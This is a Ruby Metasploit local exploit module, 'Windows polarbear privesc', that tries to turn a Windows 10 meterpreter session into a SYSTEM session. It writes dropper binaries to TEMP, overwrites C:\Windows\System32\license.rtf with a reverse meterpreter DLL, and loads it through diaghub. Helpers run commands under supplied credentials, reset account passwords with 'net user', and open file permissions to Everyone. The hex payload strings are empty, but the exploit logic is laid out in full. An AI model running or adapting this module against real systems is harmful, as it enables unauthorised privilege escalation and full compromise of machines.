require 'msf/core'
require 'msf/core/post/file'
require 'msf/core/post/windows'
require 'msf/core/exploit/exe'
require 'rex'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Runas

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows polarbear privesc',
      'Description'   => %q{
        This module will create a new session with SYSTEM privileges via the
				Polarbear exploit.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'Alex Lin'
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [
        [ 'Windows 10', { 'Arch' => ARCH_X64, 'Platform' => 'win' } ]
      ],
      'DefaultTarget' => 0
    ))

    register_options([
      OptString.new("USERNAME", [ true, "Username for current user" ]),
      OptString.new("PASSWORD", [ true, "Password for current user" ]),
      OptString.new("DOMAIN", [ true, "Windows DOMAIN for user" ]),
      OptString.new("DLLPATH", [ true, "Local file path to reverse meterpreter DLL" ]),
    ])
  end

  def priv_check
    if is_system?
      privs = session.sys.config.getprivs
      return privs.include?("SeAssignPrimaryTokenPrivilege") && privs.include?("SeIncreaseQuotaPrivilege")
    end

    false
  end

  def reset_pass(user, password)
    begin
      tmpout = cmd_exec("cmd.exe /c net user #{user} #{password}")
      return tmpout.include?("successfully")
    rescue
      return false
    end
  end

  def touch(path)
    write_file(path, "")
    cmd_exec("icacls #{path} /grant Everyone:(F)")
  end

  def exploit
    uname = datastore["USERNAME"]
    pw = datastore["PASSWORD"]
    dllpath = datastore["DLLPATH"]
    domain = datastore["DOMAIN"]
    diaghub_payload = ""
    bearjob_payload = ""
    polarbear_payload = ""
    schtasks_payload = ""
    bearjob_bytes = [bearjob_payload].pack("H*")
    polarbear_bytes = [polarbear_payload].pack("H*")
    schtasks_bytes = [schtasks_payload].pack("H*")
    diaghub_bytes = [diaghub_payload].pack("H*")
    dll = read_file(dllpath);

    tempdir = get_env("TEMP")
    cd(tempdir)
    write_file("Bear.job", bearjob_bytes)
    write_file("polarbear.exe", polarbear_bytes)
    write_file("schtasks.exe", schtasks_bytes)
    write_file("diaghub.exe", diaghub_bytes)
    write_file("met.dll", dll)
    cmd = "polarbear C:\\\\Windows\\\\System32\\\\license.rtf " + uname + " " + pw
    res = cmd_exec(cmd)
    print_status(res)
    print_status("Polarbear stage completed")
    print_status("Copying dll to license.rtf")
    write_file("cp.bat", "copy " + tempdir + "\\met.dll " + "C:\\Windows\\System32\\license.rtf\"")
    do_cmd

    cmd_exec("diaghub C:\\\\ProgramData\\\\ license.rtf")
  end

  def do_cmd
   # Make sure we meet the requirements before running the script, note no need to return
    # unless error
    return unless session.type == "meterpreter"

    pi = nil
    # check/set vars
    setpass = false
    cmdout = false
    user = datastore["USERNAME"] || nil
    password = datastore["PASSWORD"] || nil
    tempdir = get_env("TEMP")
    cmd = tempdir + "\\cp.bat"
    domain = datastore['DOMAIN']

    if setpass
      print_status("Setting user password")
      fail_with(Failure::Unknown, 'Error resetting password') unless reset_pass(user, password)
    end

    # If command output is requested, then create output file and set open permissions
    if cmdout
      system_temp = tempdir
      outpath = "#{system_temp}\\#{Rex::Text.rand_text_alpha(8)}.txt"
      touch(outpath)
      cmdstr = "cmd.exe /c #{cmd} > #{outpath}"
    else
      cmdstr = "cmd.exe /c #{cmd}"
    end

    # Check privs and execute the correct commands
    # if user use createprocesswithlogon, if system logonuser and createprocessasuser
    # execute command and get output with a poor mans pipe
    if priv_check
      print_status("Executing CreateProcessAsUserA...we are SYSTEM")
      pi = create_process_as_user(domain, user, password, nil, cmdstr)
      if pi
        session.railgun.kernel32.CloseHandle(pi[:process_handle])
        session.railgun.kernel32.CloseHandle(pi[:thread_handle])
      end
    else
      print_status("Executing CreateProcessWithLogonW...")
      pi = create_process_with_logon(domain, user, password, nil, cmdstr)
    end

    # Only process file if the process creation was successful, delete when done, give us info
    # about process
    if pi
      tmpout = read_file(outpath) if cmdout

      print_status("Command Run: #{cmdstr}")
      vprint_status("Process Handle: #{pi[:process_handle]}")
      vprint_status("Thread Handle: #{pi[:thread_handle]}")
      vprint_status("Process Id: #{pi[:process_id]}")
      vprint_status("Thread Id: #{pi[:thread_id]}")
      print_status("Command output:\r\n#{tmpout}") if cmdout
    end

    if cmdout
      print_status("Removing temp file #{outpath}")
      rm_f(outpath)
    end
  end

  def read_file(file_name)
      file = File.open(file_name, "r")
      data = file.read
      file.close
      return data
  end
end
